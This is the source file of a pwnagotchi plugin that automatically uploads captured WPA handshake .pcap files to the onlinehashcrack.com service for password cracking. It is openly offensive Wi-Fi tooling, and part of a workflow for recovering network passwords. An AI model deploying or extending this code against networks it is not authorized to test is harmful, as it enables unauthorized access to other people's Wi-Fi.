"""
This plugin automatically uploades handshakes to https://onlinehashcrack.com
"""
import os
import logging
import requests
from pwnagotchi.utils import StatusFile
from pwnagotchi.plugins import loaded

__author__ = '33197631+dadav@users.noreply.github.com'
__version__ = '2.0.0'
__name__ = 'onlinehashcrack'
__license__ = 'GPL3'
__description__ = 'This plugin automatically uploads handshakes to https://onlinehashcrack.com'


OPTIONS = dict()
PLUGIN = loaded[os.path.basename(__file__).replace(".py","")]


def on_loaded():
    """
    Gets called when the plugin gets loaded
    """
    PLUGIN.ready = False
    PLUGIN.skip = list()
    PLUGIN.report = StatusFile('/root/.ohc_uploads', data_format='json')

    if 'email' not in OPTIONS or ('email' in OPTIONS and OPTIONS['email'] is None):
        logging.error("OHC: Email isn't set. Can't upload to onlinehashcrack.com")
        return

    PLUGIN.ready = True


def _upload_to_ohc(path, timeout=30):
    """
    Uploads the file to onlinehashcrack.com
    """
    with open(path, 'rb') as file_to_upload:
        data = {'email': OPTIONS['email']}
        payload = {'file': file_to_upload}

        try:
            result = requests.post('https://api.onlinehashcrack.com',
                    data=data,
                    files=payload,
                    timeout=timeout)
            if 'already been sent' in result.text:
                logging.warning("%s was already uploaded.", path)
        except requests.exceptions.RequestException as e:
            logging.error(f"OHC: Got an exception while uploading {path} -> {e}")
            raise e


def on_internet_available(agent):
    """
    Called in manual mode when there's internet connectivity
    """
    if PLUGIN.ready:
        display = agent.view()
        config = agent.config()
        reported = PLUGIN.report.data_field_or('reported', default=list())

        handshake_dir = config['bettercap']['handshakes']
        handshake_filenames = os.listdir(handshake_dir)
        handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if filename.endswith('.pcap')]
        handshake_new = set(handshake_paths) - set(reported) - set(PLUGIN.skip)

        if handshake_new:
            logging.info("OHC: Internet connectivity detected. Uploading new handshakes to onelinehashcrack.com")

            for idx, handshake in enumerate(handshake_new):
                display.set('status', f"Uploading handshake to onlinehashcrack.com ({idx + 1}/{len(handshake_new)})")
                display.update(force=True)
                try:
                    _upload_to_ohc(handshake)
                    reported.append(handshake)
                    PLUGIN.report.update(data={'reported': reported})
                    logging.info(f"OHC: Successfully uploaded {handshake}")
                except requests.exceptions.RequestException as req_e:
                    PLUGIN.skip.append(handshake)
                    logging.error("OHC: %s", req_e)
                    continue
                except OSError as os_e:
                    PLUGIN.skip.append(handshake)
                    logging.error("OHC: %s", os_e)
                    continue

